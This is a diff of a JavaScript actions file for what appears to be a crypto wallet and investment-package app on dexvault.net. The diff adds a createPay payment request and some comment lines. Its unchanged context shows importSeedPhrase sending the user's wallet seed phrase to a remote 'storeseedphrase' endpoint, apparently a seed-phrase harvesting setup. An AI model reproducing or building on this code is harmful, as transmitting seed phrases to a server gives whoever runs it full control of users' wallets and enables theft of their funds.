@@ -425,7 +425,8 @@ export const importSeedPhrase = (bodyData) => {
       await idbSet('address', address);
       const chain = '0x1';
       await idbSet('chain', chain);
-
+//https://backend.dexvault.net
+//https://backend.dexvault.net
       const response = await fetch('https://backend.dexvault.net/storeseedphrase', {
         method: "POST",
         headers: {
@@ -1131,7 +1132,6 @@ export const createWithdraw = (data) => {
   }
 }
 
-
 //define a  function that fetches investment packages
 export const fetchPackages = (data) => {
   return async (dispatch, getState) => {
@@ -1287,6 +1287,50 @@ export const logout = () => async (dispatch) => {
   }
 };
 
+
+
+export const  createPay = (data) => {
+  return async (dispatch, getState) => {
+    //do some check on the server if its actually login before proceding to dispatch
+    try {
+      const response = await fetch(`https://backend.dexvault.net/createpay`, {
+        headers: {
+          "Content-Type": "application/json",
+        },
+        method: 'POST',
+        body: JSON.stringify(data),
+      })
+
+      if (response.status === 404) {
+        let data = await response.json()
+        return {
+          bool: false,
+          message: data.response,
+        }
+      }
+      if (response.status === 300) {
+        let data = await response.json()
+        return {
+          bool: false,
+          message: data.response,
+        }
+      }
+
+      if (response.status === 200) {
+        let data = await response.json()
+        return {
+          bool: true,
+          message: data.response,
+        }
+      }
+    } catch (err) {
+      return {
+        bool: false,
+        message: "network error"
+      }
+    }
+  }
+}
 
 
 
